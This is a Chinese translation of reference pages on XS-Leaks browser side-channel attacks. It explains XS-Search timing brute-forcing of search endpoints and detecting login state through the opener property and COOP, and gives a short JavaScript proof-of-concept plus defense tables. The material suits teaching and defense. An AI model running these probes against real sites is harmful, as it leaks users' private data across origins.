---
title: Attacks
---

# XS-Search

跨站搜索（XS-Search）是XS-Leaks攻击家族中的重要攻击原理。这类攻击通过滥用基于查询的搜索系统，从攻击者源站泄露用户信息[^1][^2]。原始攻击利用时间测量来判断搜索系统是否返回结果，其流程如下：

1. 建立返回结果的请求所需时间基准（命中），以及无结果返回的请求所需时间基准（未命中）。  
2. 对搜索接口发起[计时攻击](#timing-attacks-network-timing)，暴力破解首字符（如`?q=r`）。  
3. 若测量时间低于命中基准，则追加字符（如`?q=ra`）；否则尝试新字符（如`?q=s`）。  
4. 最终可泄露完整敏感信息（如`?q=secret`）。  

该攻击需多次计时测量以提高准确性，可通过膨胀技术和统计分析优化。此外，攻击者可不逐字符暴力破解，而是搜索特定词语或句子来仅检测结果是否存在。

此攻击的核心价值在于其原理，因其可应用于多种不同的XS-Leaks攻击场景。

## 膨胀技术  
XS-Search的膨胀技术用于提升攻击精度，使两种响应类型（命中/未命中）更易区分。以下两种机制可优化测量：  

- 若搜索系统在返回结果时将某些GET参数反射到响应中，响应体积会增大。这使得请求更易区分，因为服务器准备响应和网络传输时间显著增加。  
- 强制服务器在返回响应前执行更多计算。该方法适用于支持更复杂查询语言的搜索系统（例如Gmail中排除关键词需处理结果中的每个字符）。  

## 扩展原理  
尽管XS-Search的原始研究聚焦于计时攻击，但其原理可扩展至其他XS-Leaks。攻击者可不依赖不可靠的计时测量，转而利用其他XS-Leaks提取相同信息。  

在基于查询的搜索系统中，用户提交查询并获取关联响应，可能产生两种结果：  
1. 系统显示结果，页面呈现特定行为（状态一）；  
2. 系统未显示结果，页面行为与状态一不同（状态二）。  

若上述两种行为可通过比计时更可靠的XS-Leak区分，攻击者即可实施更高效的XS-Search攻击。例如：若页面框架数量随搜索结果变化（状态一与二可区分），则可结合[框架计数](#frame-counting) XS-Leak应用此攻击原理，其准确性可能优于计时测量。  

## 防御措施  

| 攻击变体         | [SameSite Cookies (Lax)](./defenses#opt-in-same-site-cookies) | [COOP](./defenses#opt-in-coop) | [框架防护](./defenses#opt-in-xfo) |                                          [隔离策略](./defenses#isolation-policies)                                          |
| :--------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :----------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------: |
| XS-Search（计时） |                                         ✔️                                          |                          ❌                          |                           ❌                            | [RIP](./defenses#isolation-policies-resource-isolation" >}}) 🔗 [NIP](./defenses#isolation-policies-navigation-isolation" >}}) |

🔗 – 防御机制需组合使用以应对不同场景。  

## 参考文献  
[^1]: 《跨站搜索攻击》，[链接](https://446h.cybersec.fun/xssearch.pdf)  
[^2]: 《跨站搜索(XS-Search)攻击》，Hemi Leibowitz，OWASP AppSec IL 2015，[链接](https://wiki.owasp.org/images/a/a7/AppSecIL2015_Cross-Site-Search-Attacks_HemiLeibowitz.pdf)（[备档](https://web.archive.org/web/20231226222426/https://owasp.org/www-pdf-archive/AppSecIL2015_Cross-Site-Search-Attacks_HemiLeibowitz.pdf)）  

# 

若页面将其 `opener` 属性设置为 `null` 或根据用户状态采用 [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) 防护机制，攻击者便可推断跨站点的用户状态信息。例如，通过检查窗口引用，攻击者只需在 iframe（或新窗口）中打开一个仅认证用户可访问的端点，即可检测用户是否已登录。[运行演示](https://xsinator.com/testing.html#COOP%20Leak)

## 代码片段  
以下代码演示如何检测 `opener` 属性是否被设为 `null`，或 [COOP](./defenses#opt-in-coop) 标头是否存在非 `unsafe-none` 的值。此检测适用于 iframe 和新窗口。

```javascript
// 定义存在漏洞的URL
const v_url = 'https://example.org/profile';

const exploit = (url, new_window) => {
  let win;
  if(new_window) {
    // 在新标签页打开URL，检测win.opener是否受COOP影响
    // 或被设为null
    win = open(url);
  } else {
    // 创建iframe检测opener是否定义
    // 该方法不适用于COOP检测或已启用框架防护的页面
    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
    // 将iframe重定向至目标URL
    win = open(url, "xsleaks");
  }
  
  // 等待2秒确保页面加载
  setTimeout(() => {
    if (win.closed) {
      console.log("opener已关闭");
    } else {
      // 检测新窗口的opener属性
      if(!win.opener) console.log("win.opener为null");
      else console.log("win.opener已定义");
    }
  }, 2000);
}
exploit(v_url);
exploit(v_url, 1);
```

## 防御措施  
缓解此类XS-Leak需保持页面行为一致性：  
- **统一COOP配置**：所有页面应设置相同的 `opener` 属性值  
- **避免JS动态设置**：通过JavaScript设置 `opener` 为 `null` 可能存在边界情况，因为iframe的sandbox属性可完全禁用JavaScript  

